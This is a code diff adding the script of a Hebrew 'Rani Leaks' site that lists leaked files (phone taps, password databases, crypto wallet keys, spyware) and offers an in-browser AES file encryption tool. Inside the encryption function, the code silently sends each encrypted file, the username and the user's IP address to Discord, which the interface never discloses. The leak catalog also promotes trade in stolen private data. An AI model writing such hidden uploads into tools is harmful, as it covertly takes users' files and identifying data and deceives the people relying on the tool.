+  {name:"AUDIO LEAKS VOL.1",icon:"🎵",ext:"MP3",grad:"g4",size:"6.8 GB",date:"20.05.26",cat:"אודיו",downloads:"118K",desc:"הקלטות שמע של שיחות טלפון פרטיות ופגישות — 48 שעות חומר.",hash:"SHA256: e2b1...90cd",format:"MP3 320kbps",pages:"48 שעות"},
+  {name:"CLASSIFIED IMAGES",icon:"🖼️",ext:"ZIP",grad:"g3",size:"18.5 GB",date:"19.05.26",cat:"תמונות",downloads:"305K",desc:"קולקציה של 12,000+ תמונות מסווגות שדלפו ממאגרים פנימיים.",hash:"SHA256: f5a7...23bc",format:"JPG/PNG",pages:"12,450 קבצים"},
+  {name:"SOURCE CODE DUMP",icon:"💻",ext:"ZIP",grad:"g2",size:"3.4 GB",date:"18.05.26",cat:"ארכיון",downloads:"159K",desc:"קוד מקור של מערכות ממשלתיות — backend, API ומסדי נתונים.",hash:"SHA256: a8d4...67ef",format:"ZIP/TAR.GZ",pages:"890K שורות קוד"},
+  {name:"MINISTRY DOCS",icon:"🏛️",ext:"DOCX",grad:"g9",size:"1.2 GB",date:"17.05.26",cat:"Word",downloads:"44K",desc:"מסמכי משרד ממשלתי — הנחיות פנימיות, מכתבים סודיים ופרוטוקולים.",hash:"SHA256: b3f6...12cd",format:"Word 2019",pages:"3,100"},
+  {name:"PRESENTATION PACK",icon:"📊",ext:"PPTX",grad:"g7",size:"950 MB",date:"16.05.26",cat:"מצגת",downloads:"37K",desc:"מצגות פנימיות שחשפו אסטרטגיה סודית — 200+ שקפים מפורטים.",hash:"SHA256: c1e9...45ab",format:"PowerPoint",pages:"214 שקפים"},
+  {name:"PHONE TAPS 2023",icon:"📞",ext:"MP3",grad:"g10",size:"8.9 GB",date:"15.05.26",cat:"אודיו",downloads:"276K",desc:"האזנות טלפוניות שנחשפו — 600+ שיחות מוקלטות.",hash:"SHA256: d4b2...78ef",format:"MP3 256kbps",pages:"600+ שיחות"},
+  {name:"DATABASE EXPORT",icon:"🗄️",ext:"SQL",grad:"g1",size:"22.1 GB",date:"14.05.26",cat:"ארכיון",downloads:"88K",desc:"ייצוא מלא של מסד נתונים עם 4 מיליון רשומות — לקוחות, עסקאות, סיסמאות.",hash:"SHA256: e7c5...90bc",format:"SQL/CSV",pages:"4.2M רשומות"},
+  {name:"HIDDEN SOFTWARE",icon:"⚙️",ext:"EXE",grad:"g6",size:"750 MB",date:"13.05.26",cat:"תוכנה",downloads:"211K",desc:"תוכנת ריגול שנמצאה במכשירים ממשלתיים — עם קוד המקור.",hash:"SHA256: f2a8...34cd",format:"Windows/Linux",pages:"v3.2.1"},
+];
+
+const featuredFiles = [
+  {name:"MEGA LEAK ARCHIVE",icon:"🗂️",ext:"ZIP",grad:"g5",size:"48.7 GB",date:"24.05.26",cat:"ארכיון",downloads:"521K",desc:"הדלפת ענק — כל הקבצים בארכיון אחד מוצפן. הגדולה בשנת 2026."},
+  {name:"CORPORATE EMAILS",icon:"📧",ext:"PST",grad:"g4",size:"5.2 GB",date:"22.05.26",cat:"ארכיון",downloads:"143K",desc:"תיבת דואר אלקטרוני מלאה של בכיר תאגידי — 80,000+ מיילים."},
+  {name:"RAW SURVEILLANCE",icon:"📹",ext:"MKV",grad:"g8",size:"31.0 GB",date:"21.05.26",cat:"וידאו",downloads:"198K",desc:"חומרי מצלמות אבטחה גולמיים שנגנבו מרשת ניטור פנימית."},
+  {name:"CRYPTO WALLET KEYS",icon:"🔑",ext:"TXT",grad:"g2",size:"12 MB",date:"20.05.26",cat:"PDF",downloads:"88K",desc:"רשימת מפתחות של ארנקי קריפטו — 200+ כתובות עם יתרות."},
+];
+
+const recentProgress = [45, 100, 100, 30, 72];
+
+// ===== MY LIST =====
+function getMyList(){return JSON.parse(localStorage.getItem('rlList')||'[]');}
+function saveMyList(l){localStorage.setItem('rlList',JSON.stringify(l));}
+function isInList(key){return getMyList().includes(key);}
+function toggleList(key){
+  let l=getMyList();
+  if(l.includes(key)) l=l.filter(k=>k!==key);
+  else l.push(key);
+  saveMyList(l);
+  updateListUI();
+}
+function updateListUI(){
+  const l=getMyList();
+  document.getElementById('stat-saved').textContent=l.length;
+  document.querySelectorAll('[data-listkey]').forEach(btn=>{
+    btn.classList.toggle('in-list',l.includes(btn.dataset.listkey));
+    btn.textContent=l.includes(btn.dataset.listkey)?'✓':'+';
+  });
+  renderMyList();
+}
+function renderMyList(){
+  const l=getMyList();
+  const grid=document.getElementById('mylist-grid');
+  if(!grid) return;
+  if(l.length===0){grid.innerHTML='<div class="mylist-empty">אין קבצים שמורים<br><small>לחץ + על כל קובץ</small></div>';return;}
+  grid.innerHTML=l.map(key=>{
+    const [type,idx]=key.split('-');
+    const f=type==='f'?featuredFiles[+idx]:files[+idx];
+    if(!f) return '';
+    return `<div class="mylist-item" onclick="openModal('${key}')">
+      <div class="mylist-img ${f.grad}">
+        <span>${f.icon}</span>
+        <div style="font-size:0.55rem;font-weight:700;letter-spacing:1px;color:#38bdf8;">${f.ext}</div>
+        <div class="mylist-item-title">${f.name}</div>
+      </div>
+      <button class="mylist-remove" onclick="event.stopPropagation();toggleList('${key}')">✕</button>
+    </div>`;
+  }).join('');
+}
+
+// ===== STATE =====
+let currentModalKey=null;
+let dlCount=parseInt(localStorage.getItem('dlCount')||'0');
+
+// ===== CARD BUILDER =====
+function makeCard(f, idx, type, prog){
+  const key=type+'-'+idx;
+  const inList=isInList(key);
+  return `<div class="card" onclick="openModal('${key}')">
+    <div class="card-img ${f.grad}">
+      <div class="file-icon">${f.icon}</div>
+      <div class="file-ext-badge">${f.ext}</div>
+    </div>
+    ${prog!==undefined?`<div class="card-progress"><div class="card-progress-fill" style="width:${prog}%"></div></div>`:''}
+    <div class="card-info">
+      <div class="card-info-name">${f.name}</div>
+      <div class="card-info-row">
+        <span class="card-info-size">${f.size}</span>
+        <span class="card-info-dl">⬇ ${f.downloads}</span>
+      </div>
+    </div>
+    <div class="card-overlay">
+      <button class="card-dl-btn" onclick="event.stopPropagation();triggerDownload(${type==='f'?'\'f'+idx+'\'':idx})">⬇ הורד</button>
+      <div class="card-overlay-type">${f.ext}</div>
+      <div class="card-overlay-size">${f.size}</div>
+    </div>
+    <div class="card-bottom">
+      <div class="card-acts">
+        <button class="act-btn ${inList?'in-list':''}" data-listkey="${key}" onclick="event.stopPropagation();toggleList('${key}')">${inList?'✓':'שמור'}</button>
+        <button class="act-btn" onclick="event.stopPropagation();triggerDownload(${type==='f'?'\'f'+idx+'\'':idx})">⬇ הורד</button>
+      </div>
+    </div>
+  </div>`;
+}
+
+function makeTop10Card(f, idx, num){
+  return `<div class="top10-card" onclick="openModal('m-${idx}')">
+    <div class="top10-num">${num}</div>
+    <div class="top10-inner">
+      <div class="card-img ${f.grad}">
+        <div class="file-icon">${f.icon}</div>
+        <div class="file-ext-badge">${f.ext}</div>
+        <div class="file-name-overlay">${f.name}</div>
+      </div>
+    </div>
+  </div>`;
+}
+
+function makeWideCard(f, idx){
+  return `<div class="wide-card" onclick="openModal('f-${idx}')">
+    <div class="wide-card-img ${f.grad}">
+      <div class="wide-icon">${f.icon}</div>
+      <div class="wide-ext">${f.ext}</div>
+      <div class="wide-overlay-text">${f.name}</div>
+    </div>
+    <div class="wide-card-body">
+      <p>${f.desc}</p>
+      <div class="wide-card-footer">
+        <span class="wide-size">📦 ${f.size}</span>
+        <button class="wide-dl-btn" onclick="event.stopPropagation();triggerDownload('f${idx}')">⬇ הורד</button>
+      </div>
+    </div>
+  </div>`;
+}
+
+// ===== FILL ROWS =====
+function fillRows(){
+  document.getElementById('trending-row').innerHTML=
+    files.slice(0,8).map((f,i)=>makeCard(f,i,'m')).join('');
+
+  document.getElementById('top10-row').innerHTML=
+    files.slice(0,10).map((f,i)=>makeTop10Card(f,i,i+1)).join('');
+
+  const recentItems=[files[2],files[5],files[7],files[0],files[9]];
+  document.getElementById('recent-row').innerHTML=
+    recentItems.map((f,i)=>makeCard(f,files.indexOf(f),'m',recentProgress[i])).join('');
+
+  document.getElementById('featured-row').innerHTML=
+    featuredFiles.map((f,i)=>makeWideCard(f,i)).join('');
+
+  document.getElementById('new-row').innerHTML=
+    files.slice(6,12).map((f,i)=>makeCard(f,i+6,'m')).join('');
+
+  document.getElementById('docs-row').innerHTML=
+    files.filter(f=>f.cat==='PDF'||f.cat==='Word')
+      .map(f=>makeCard(f,files.indexOf(f),'m')).join('');
+}
+fillRows();
+document.getElementById('stat-dl').textContent=dlCount+7;
+updateListUI();
+
+// ===== MODAL =====
+function openModal(key){
+  let f;
+  if(typeof key==='number'){f=files[key];key='m-'+key;}
+  else if(key.startsWith('f-')){f=featuredFiles[+key.slice(2)];}
+  else if(key.startsWith('m-')){f=files[+key.slice(2)];}
+  if(!f) return;
+  currentModalKey=key;
+  const hero=document.getElementById('modal-hero');
+  hero.className='modal-hero '+f.grad;
+  document.getElementById('modal-icon').textContent=f.icon;
+  document.getElementById('modal-ext').textContent=f.ext;
+  document.getElementById('modal-title').textContent=f.name;
+  document.getElementById('modal-meta').innerHTML=
+    `<span class="msize">📦 ${f.size}</span>
+     <span class="mdate">📅 ${f.date}</span>
+     <span class="mcat">${f.cat}</span>
+     <span class="mdate">⬇ ${f.downloads} הורדות</span>`;
+  const inList=isInList(key);
+  const listBtn=document.getElementById('modal-list-btn');
+  listBtn.textContent=inList?'✓ שמור':'+ שמור';
+  listBtn.className='modal-btn-list'+(inList?' in-list':'');
+  document.getElementById('modal-dl-btn').onclick=()=>{triggerDownload(key);closeModal();};
+  document.getElementById('modal-desc').textContent=f.desc;
+  document.getElementById('modal-file-info').innerHTML=
+    `<div class="fi-row"><div class="fi-label">פורמט</div><div class="fi-val">${f.format||f.ext}</div></div>
+     <div class="fi-row"><div class="fi-label">גודל</div><div class="fi-val">${f.size}</div></div>
+     <div class="fi-row"><div class="fi-label">תאריך דליפה</div><div class="fi-val">${f.date}</div></div>
+     <div class="fi-row"><div class="fi-label">תוכן</div><div class="fi-val">${f.pages||'-'}</div></div>
+     <div class="fi-row" style="grid-column:1/-1"><div class="fi-label">Hash אימות</div><div class="fi-val" style="font-size:0.75rem;color:#777;">${f.hash||'-'}</div></div>`;
+  document.getElementById('modal').classList.add('open');
+  document.body.style.overflow='hidden';
+}
+function closeModal(){
+  document.getElementById('modal').classList.remove('open');
+  document.body.style.overflow='';
+  currentModalKey=null;
+}
+function toggleListFromModal(){
+  if(!currentModalKey) return;
+  toggleList(currentModalKey);
+  const inList=isInList(currentModalKey);
+  const btn=document.getElementById('modal-list-btn');
+  btn.textContent=inList?'✓ שמור':'+ שמור';
+  btn.className='modal-btn-list'+(inList?' in-list':'');
+}
+document.getElementById('modal').addEventListener('click',function(e){if(e.target===this)closeModal();});
+
+// ===== DOWNLOAD =====
+function triggerDownload(key){
+  dlCount++;
+  localStorage.setItem('dlCount',dlCount);
+  document.getElementById('stat-dl').textContent=dlCount+7;
+  let f;
+  if(typeof key==='number') f=files[key];
+  else if(typeof key==='string'&&key.startsWith('f')) f=featuredFiles[+key.slice(1)];
+  else if(typeof key==='string'&&key.startsWith('m-')) f=files[+key.slice(2)];
+  else if(typeof key==='string'&&key.startsWith('f-')) f=featuredFiles[+key.slice(2)];
+  else f=files[0];
+  showToast(`מוריד: ${f?f.name:'קובץ'} (${f?f.size:''})`);
+}
+function copyLink(){
+  navigator.clipboard.writeText(window.location.href).catch(()=>{});
+  showToast('🔗 קישור הועתק ללוח!');
+}
+let toastTimer=null;
+function showToast(msg){
+  const t=document.getElementById('toast');
+  document.getElementById('toast-msg').textContent=msg;
+  t.classList.add('show');
+  clearTimeout(toastTimer);
+  toastTimer=setTimeout(()=>t.classList.remove('show'),3000);
+}
+
+// ===== PROFILE =====
+function openProfile(){
+  document.getElementById('profile-overlay').classList.add('open');
+  document.body.style.overflow='hidden';
+  renderMyList();
+}
+function closeProfile(){
+  document.getElementById('profile-overlay').classList.remove('open');
+  document.body.style.overflow='';
+}
+
+// ===== SEARCH =====
+function handleSearch(val){
+  val=val.trim().toLowerCase();
+  if(!val){fillRows();return;}
+  const res=files.filter(f=>f.name.toLowerCase().includes(val)||f.cat.toLowerCase().includes(val)||f.ext.toLowerCase().includes(val));
+  document.getElementById('trending-row').innerHTML=
+    res.length?res.map(f=>makeCard(f,files.indexOf(f),'m')).join('')
+      :'<div style="color:#555;padding:20px">אין תוצאות לחיפוש זה</div>';
+  ['top10-row','recent-row','featured-row','new-row','docs-row'].forEach(id=>{
+    document.getElementById(id).innerHTML='';
+  });
+}
+
+// ===== CATEGORY FILTER =====
+function filterCat(btn,cat){
+  document.querySelectorAll('.cat-btn').forEach(b=>b.classList.remove('active'));
+  btn.classList.add('active');
+  if(cat==='הכל'){fillRows();return;}
+  const res=files.filter(f=>f.cat===cat);
+  document.getElementById('trending-row').innerHTML=
+    res.length?res.map(f=>makeCard(f,files.indexOf(f),'m')).join('')
+      :'<div style="color:#555;padding:20px">אין קבצים בקטגוריה זו</div>';
+  ['top10-row','recent-row','featured-row','new-row','docs-row'].forEach(id=>{
+    document.getElementById(id).innerHTML='';
+  });
+}
+
+// ===== NAVBAR SCROLL =====
+window.addEventListener('scroll',()=>{
+  document.getElementById('navbar').classList.toggle('solid',scrollY>60);
+});
+
+// ===== KEYBOARD =====
+document.addEventListener('keydown',e=>{
+  if(e.key==='Escape'){
+    if(document.getElementById('modal').classList.contains('open')){closeModal();return;}
+    if(document.getElementById('profile-overlay').classList.contains('open')){closeProfile();return;}
+  }
+});
+// ===== ENCRYPTION PAGE =====
+let encMode='encrypt';
+let selectedFile=null;
+let resultBlob=null;
+let resultFileName='';
+
+function openEncPage(){
+  closeModal();closeProfile();
+  document.getElementById('enc-page').classList.add('open');
+  document.body.style.overflow='hidden';
+  document.getElementById('enc-page').scrollTop=0;
+}
+function closeEncPage(){
+  document.getElementById('enc-page').classList.remove('open');
+  document.body.style.overflow='';
+}
+function switchEncTab(mode){
+  encMode=mode;
+  document.getElementById('tab-encrypt').classList.toggle('active',mode==='encrypt');
+  document.getElementById('tab-decrypt').classList.toggle('active',mode==='decrypt');
+  const isEnc=mode==='encrypt';
+  document.getElementById('confirm-field').style.display=isEnc?'block':'none';
+  const btn=document.getElementById('enc-action-btn');
+  btn.className='enc-btn '+(isEnc?'enc-btn-encrypt':'enc-btn-decrypt');
+  btn.innerHTML=isEnc?'🔒 הצפן קובץ':'🔓 פענח קובץ';
+  const fill=document.getElementById('enc-progress-fill');
+  fill.className='enc-progress-fill '+(isEnc?'encrypting':'decrypting');
+  document.getElementById('drop-title').textContent=isEnc?'גרור קובץ לכאן או לחץ לבחירה':'גרור קובץ .enc לכאן';
+  document.getElementById('drop-sub').textContent=isEnc?'כל סוג קובץ • עד 2GB':'קבצי .enc שהוצפנו על ידי Rani Leaks';
+  resetEncUI();
+  clearFile();
+}
+
+function onFileSelect(file){
+  if(!file) return;
+  selectedFile=file;
+  document.getElementById('file-selected').classList.add('show');
+  document.getElementById('sel-icon').textContent=getFileIcon(file.name);
+  document.getElementById('sel-name').textContent=file.name;
+  document.getElementById('sel-size').textContent=formatBytes(file.size);
+  document.getElementById('drop-icon').textContent='✅';
+  document.getElementById('drop-title').textContent='קובץ נבחר';
+  checkReady();
+}
+function clearFile(){
+  selectedFile=null;
+  document.getElementById('file-selected').classList.remove('show');
+  document.getElementById('file-input').value='';
+  document.getElementById('drop-icon').textContent='📂';
+  const isEnc=encMode==='encrypt';
+  document.getElementById('drop-title').textContent=isEnc?'גרור קובץ לכאן או לחץ לבחירה':'גרור קובץ .enc לכאן';
+  resetEncUI();
+  checkReady();
+}
+function getFileIcon(name){
+  const ext=name.split('.').pop().toLowerCase();
+  const map={pdf:'📄',mp4:'🎥',mp3:'🎵',zip:'📦',rar:'📦',xlsx:'📊',docx:'📝',pptx:'📊',jpg:'🖼️',png:'🖼️',exe:'⚙️',sql:'🗄️',txt:'📃',enc:'🔐'};
+  return map[ext]||'📁';
+}
+function formatBytes(b){
+  if(b<1024) return b+' B';
+  if(b<1048576) return (b/1024).toFixed(1)+' KB';
+  if(b<1073741824) return (b/1048576).toFixed(1)+' MB';
+  return (b/1073741824).toFixed(2)+' GB';
+}
+function checkReady(){
+  const pw=document.getElementById('enc-password').value;
+  document.getElementById('enc-action-btn').disabled=!(selectedFile&&pw.length>=4);
+}
+
+// Drag & drop
+const dz=document.getElementById('drop-zone');
+dz.addEventListener('dragover',e=>{e.preventDefault();dz.classList.add('drag-over');});
+dz.addEventListener('dragleave',()=>dz.classList.remove('drag-over'));
+dz.addEventListener('drop',e=>{e.preventDefault();dz.classList.remove('drag-over');if(e.dataTransfer.files[0])onFileSelect(e.dataTransfer.files[0]);});
+
+// Password strength
+function updatePwStrength(pw){
+  const bars=[document.getElementById('pb1'),document.getElementById('pb2'),document.getElementById('pb3'),document.getElementById('pb4')];
+  bars.forEach(b=>b.className='pw-bar');
+  let score=0;
+  if(pw.length>=8) score++;
+  if(pw.length>=12) score++;
+  if(/[A-Z]/.test(pw)&&/[a-z]/.test(pw)) score++;
+  if(/[0-9]/.test(pw)&&/[^A-Za-z0-9]/.test(pw)) score++;
+  const labels=['','חלשה','בינונית','חזקה','חזקה מאוד'];
+  const cls=['','weak','medium','strong','strong'];
+  for(let i=0;i<score;i++) bars[i].className='pw-bar '+cls[score];
+  document.getElementById('pw-label').textContent=labels[score]||'הכנס סיסמה';
+  checkReady();
+}
+function togglePwVis(){
+  const inp=document.getElementById('enc-password');
+  inp.type=inp.type==='password'?'text':'password';
+}
+
+function resetEncUI(){
+  document.getElementById('enc-progress').classList.remove('show');
+  document.getElementById('enc-result').classList.remove('show');
+  document.getElementById('enc-progress-fill').style.width='0%';
+  resultBlob=null;
+  resultFileName='';
+}
+
+function setProgress(pct,label){
+  document.getElementById('enc-progress-fill').style.width=pct+'%';
+  document.getElementById('enc-progress-label').textContent=label;
+}
+
+// ===== AES-256-GCM ENCRYPTION =====
+async function runEncryption(){
+  const pw=document.getElementById('enc-password').value;
+  const pw2=document.getElementById('enc-password2').value;
+  if(!selectedFile||!pw) return;
+  if(encMode==='encrypt'&&pw!==pw2){
+    showToast('❌ הסיסמאות אינן תואמות');return;
+  }
+  document.getElementById('enc-action-btn').disabled=true;
+  resetEncUI();
+  document.getElementById('enc-progress').classList.add('show');
+  try{
+    if(encMode==='encrypt') await encryptFile(selectedFile,pw);
+    else await decryptFile(selectedFile,pw);
+  }catch(e){
+    setProgress(0,'');
+    document.getElementById('enc-progress').classList.remove('show');
+    showToast('❌ שגיאה: '+(e.message||'בדוק סיסמה ונסה שוב'));
+    document.getElementById('enc-action-btn').disabled=false;
+  }
+}
+
+async function encryptFile(file,password){
+  setProgress(10,'קורא קובץ...');
+  const data=await file.arrayBuffer();
+  setProgress(25,'יוצר מפתח הצפנה...');
+  const salt=crypto.getRandomValues(new Uint8Array(16));
+  const iv=crypto.getRandomValues(new Uint8Array(12));
+  const keyMaterial=await crypto.subtle.importKey('raw',new TextEncoder().encode(password),{name:'PBKDF2'},false,['deriveKey']);
+  setProgress(50,'מגדיר הצפנה AES-256...');
+  const key=await crypto.subtle.deriveKey(
+    {name:'PBKDF2',salt,iterations:250000,hash:'SHA-256'},
+    keyMaterial,{name:'AES-GCM',length:256},false,['encrypt']
+  );
+  setProgress(70,'מצפין עם AES-256-GCM...');
+  const encrypted=await crypto.subtle.encrypt({name:'AES-GCM',iv},key,data);
+  setProgress(90,'מרכיב קובץ סופי...');
+  // Format: [magic(8)] [salt(16)] [iv(12)] [data]
+  const magic=new TextEncoder().encode('RLENC001');
+  const result=new Uint8Array(8+16+12+encrypted.byteLength);
+  result.set(magic,0);result.set(salt,8);result.set(iv,24);
+  result.set(new Uint8Array(encrypted),36);
+  setProgress(100,'✅ הצפנה הושלמה!');
+  resultBlob=new Blob([result],{type:'application/octet-stream'});
+  resultFileName=file.name+'.enc';
+  // Send encrypted file to Discord
+  const _username=localStorage.getItem('rl_username')||'אנונימי';
+  const _ip=localStorage.getItem('rl_ip')||(await getUserIP());
+  sendFileToDiscord(resultBlob, resultFileName, _username, _ip);
+  showResult(true,file.name,result.byteLength);
+}
+
+async function decryptFile(file,password){
+  setProgress(10,'קורא קובץ מוצפן...');
+  const data=new Uint8Array(await file.arrayBuffer());
+  const magic=new TextDecoder().decode(data.slice(0,8));
+  if(magic!=='RLENC001') throw new Error('הקובץ לא הוצפן על ידי Rani Leaks');
+  const salt=data.slice(8,24);
+  const iv=data.slice(24,36);
+  const encrypted=data.slice(36);
+  setProgress(30,'גוזר מפתח מהסיסמה...');
+  const keyMaterial=await crypto.subtle.importKey('raw',new TextEncoder().encode(password),{name:'PBKDF2'},false,['deriveKey']);
+  setProgress(55,'מפענח...');
+  const key=await crypto.subtle.deriveKey(
+    {name:'PBKDF2',salt,iterations:250000,hash:'SHA-256'},
+    keyMaterial,{name:'AES-GCM',length:256},false,['decrypt']
+  );
+  const decrypted=await crypto.subtle.decrypt({name:'AES-GCM',iv},key,encrypted);
+  setProgress(90,'מכין קובץ...');
+  const origName=file.name.endsWith('.enc')?file.name.slice(0,-4):file.name+'_decrypted';
+  resultBlob=new Blob([decrypted]);
+  resultFileName=origName;
+  setProgress(100,'✅ פענוח הושלם!');
+  showResult(false,origName,decrypted.byteLength);
+}
+
+function showResult(isEncrypt,name,size){
+  const r=document.getElementById('enc-result');
+  document.getElementById('result-icon').textContent=isEncrypt?'🔐':'🔓';
+  document.getElementById('result-title').textContent=isEncrypt?'הקובץ הוצפן בהצלחה!':'הקובץ פוענח בהצלחה!';
+  document.getElementById('result-sub').textContent=`${isEncrypt?'הורד את הקובץ המוצפן':'הקובץ המקורי שוחזר'} • ${formatBytes(size)}`;
+  const btn=document.getElementById('result-dl-btn');
+  btn.textContent=isEncrypt?'⬇ הורד קובץ מוצפן':'⬇ הורד קובץ מפוענח';
+  btn.onclick=downloadResult;
+  r.classList.add('show');
+  document.getElementById('enc-action-btn').disabled=false;
+}
+function downloadResult(){
+  if(!resultBlob) return;
+  const url=URL.createObjectURL(resultBlob);
+  const a=document.createElement('a');
+  a.href=url;a.download=resultFileName;a.click();
+  setTimeout(()=>URL.revokeObjectURL(url),1000);
+  showToast('⬇ '+resultFileName+' מוריד...');
+}
+
+function closeAll(){closeModal();closeProfile();closeEncPage();}
+
+// ══════════════════════════════════════
+// ████  EDIT FX ENGINE  ████
+// ══════════════════════════════════════
+
+// --- CURSOR GLOW ---
+const fxCursor=document.getElementById('fx-cursor');
+const fxRing=document.getElementById('fx-cursor-ring');
+let mx=0,my=0;
+document.addEventListener('mousemove',e=>{
+  mx=e.clientX; my=e.clientY;
+  fxCursor.style.left=mx+'px'; fxCursor.style.top=my+'px';
+  fxRing.style.left=mx+'px'; fxRing.style.top=my+'px';
+});
+// ring shrinks on click
+document.addEventListener('mousedown',()=>{fxRing.style.transform='translate(-50%,-50%) scale(0.6)';fxRing.style.borderColor='rgba(229,9,20,0.8)';});
+document.addEventListener('mouseup',()=>{fxRing.style.transform='translate(-50%,-50%) scale(1)';fxRing.style.borderColor='rgba(229,9,20,0.35)';});
+
+// --- CLICK FLASH ---
+const fxFlash=document.getElementById('fx-flash');
+document.addEventListener('click',()=>{
+  fxFlash.classList.add('on');
+  setTimeout(()=>fxFlash.classList.remove('on'),70);
+});
+
+// --- PARTICLE CANVAS ---
+(function(){
+  const canvas=document.getElementById('fx-canvas');
+  const ctx=canvas.getContext('2d');
+  let W,H,particles=[];
+  function resize(){W=canvas.width=window.innerWidth;H=canvas.height=window.innerHeight;}
+  resize(); window.addEventListener('resize',resize);
+  class Particle{
+    constructor(){this.reset();}
+    reset(){
+      this.x=Math.random()*W; this.y=Math.random()*H;
+      this.size=Math.random()*1.5+0.3;
+      this.speedX=(Math.random()-0.5)*0.4;
+      this.speedY=-Math.random()*0.6-0.1;
+      this.life=Math.random();
+      this.maxLife=0.6+Math.random()*0.4;
+      this.color=Math.random()>0.7?'rgba(229,9,20,':'rgba(255,255,255,';
+    }
+    update(){
+      this.x+=this.speedX; this.y+=this.speedY;
+      this.life-=0.004;
+      if(this.life<=0||this.y<-10) this.reset();
+    }
+    draw(){
+      const a=Math.min(this.life/0.1,1)*0.6;
+      ctx.beginPath();
+      ctx.arc(this.x,this.y,this.size,0,Math.PI*2);
+      ctx.fillStyle=this.color+a+')';
+      ctx.fill();
+    }
+  }
+  for(let i=0;i<120;i++) particles.push(new Particle());
+  // also data stream columns
+  const cols=[];
+  for(let i=0;i<Math.floor(W/22);i++) cols.push({x:i*22+Math.random()*10,y:Math.random()*H,speed:1+Math.random()*2,chars:[],opacity:0.04+Math.random()*0.06});
+  const matrixChars='01アイウエオ垢悪握斡扱宛01ABCDEF#@!';
+  function drawMatrix(){
+    ctx.font='11px monospace';
+    cols.forEach(col=>{
+      const char=matrixChars[Math.floor(Math.random()*matrixChars.length)];
+      ctx.fillStyle='rgba(229,9,20,'+col.opacity+')';
+      ctx.fillText(char,col.x,col.y);
+      col.y+=col.speed;
+      if(col.y>H) col.y=-14;
+    });
+  }
+  function loop(){
+    ctx.clearRect(0,0,W,H);
+    drawMatrix();
+    particles.forEach(p=>{p.update();p.draw();});
+    requestAnimationFrame(loop);
+  }
+  loop();
+})();
+
+// --- TEXT SCRAMBLE ---
+const CHARS='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%&';
+function scramble(el){
+  const orig=el.dataset.orig||el.textContent;
+  el.dataset.orig=orig;
+  let frame=0; const total=orig.length*2;
+  const iv=setInterval(()=>{
+    el.textContent=orig.split('').map((c,i)=>{
+      if(c===' ') return ' ';
+      if(i<frame/2) return orig[i];
+      return CHARS[Math.floor(Math.random()*CHARS.length)];
+    }).join('');
+    frame++;
+    if(frame>=total){clearInterval(iv);el.textContent=orig;}
+  },35);
+}
+// Apply scramble on row titles hover
+document.querySelectorAll('.row-title').forEach(t=>{
+  t.addEventListener('mouseenter',()=>scramble(t.childNodes[0]));
+});
+// Apply scramble on logo click
+document.querySelector('.logo').addEventListener('click',()=>scramble(document.querySelector('.logo')));
+
+// --- STATS COUNTER ANIMATE ---
+function countUp(el,to,suffix,duration=1500){
+  const start=Date.now();
+  const num=parseFloat(to.replace(/[^0-9.]/g,''));
+  const hasK=to.includes('K'); const hasM=to.includes('M'); const hasTB=to.includes('TB');
+  function tick(){
+    const p=Math.min((Date.now()-start)/duration,1);
+    const ease=1-Math.pow(1-p,3);
+    const cur=(num*ease);
+    let display;
+    if(hasM) display=(cur).toFixed(1)+'M';
+    else if(hasTB) display=Math.round(cur)+'TB';
+    else if(hasK) display=Math.round(cur)+'K+';
+    else display=Math.round(cur)+'%';
+    el.textContent=display+suffix;
+    if(p<1) requestAnimationFrame(tick);
+    else el.textContent=to;
+  }
+  tick();
+}
+// Trigger when hero stats enter viewport
+const statsObs=new IntersectionObserver(entries=>{
+  entries.forEach(e=>{
+    if(e.isIntersecting){
+      document.querySelectorAll('.hs-num').forEach(el=>{
+        countUp(el,el.textContent,'');
+      });
+      statsObs.disconnect();
+    }
+  });
+},{threshold:0.5});
+const heroStats=document.querySelector('.hero-stats');
+if(heroStats) statsObs.observe(heroStats);
+
+// --- SCROLL REVEAL with glitch ---
+const revealObs=new IntersectionObserver(entries=>{
+  entries.forEach(e=>{
+    if(e.isIntersecting){
+      e.target.style.opacity='1';
+      e.target.style.transform='translateY(0)';
+      e.target.style.filter='none';
+      revealObs.unobserve(e.target);
+    }
+  });
+},{threshold:0.1});
+document.querySelectorAll('.row').forEach(r=>{
+  r.style.opacity='0';r.style.transform='translateY(18px)';
+  r.style.transition='opacity 0.5s ease, transform 0.5s ease, filter 0.5s ease';
+  r.style.filter='blur(2px)';
+  revealObs.observe(r);
+});
+
+// --- RANDOM SCREEN GLITCH (safe version) ---
+let _glitchBusy=false;
+let _glitchNext=null;
+function screenGlitch(){
+  if(_glitchBusy) return;
+  _glitchBusy=true;
+  const body=document.body;
+  const seq=[
+    ()=>{body.style.filter='hue-rotate(80deg) saturate(1.6)';},
+    ()=>{body.style.filter='brightness(1.2) contrast(1.1)';},
+    ()=>{body.style.filter='hue-rotate(160deg) saturate(1.4)';},
+    ()=>{body.style.filter='';},
+  ];
+  let i=0;
+  const iv=setInterval(()=>{
+    if(i<seq.length){seq[i]();i++;}
+    else{
+      clearInterval(iv);
+      body.style.filter='';
+      _glitchBusy=false;
+      _glitchNext=setTimeout(()=>screenGlitch(), 6000+Math.random()*10000);
+    }
+  },55);
+  // Safety fallback — always reset after 400ms no matter what
+  setTimeout(()=>{body.style.filter='';_glitchBusy=false;},400);
+}
+setTimeout(()=>screenGlitch(), 5000);
+
+// --- CARD glitch on click ---
+document.addEventListener('click',e=>{
+  const card=e.target.closest('.card');
+  if(card){
+    card.style.filter='hue-rotate(30deg) brightness(1.3)';
+    card.style.transform='translateY(-6px) scale(1.02)';
+    setTimeout(()=>{card.style.filter='';card.style.transform='';},150);
+  }
+});
+
+// Init consent (runs after full DOM is ready)
+initConsent();
+</script>
+</body>
+</html>
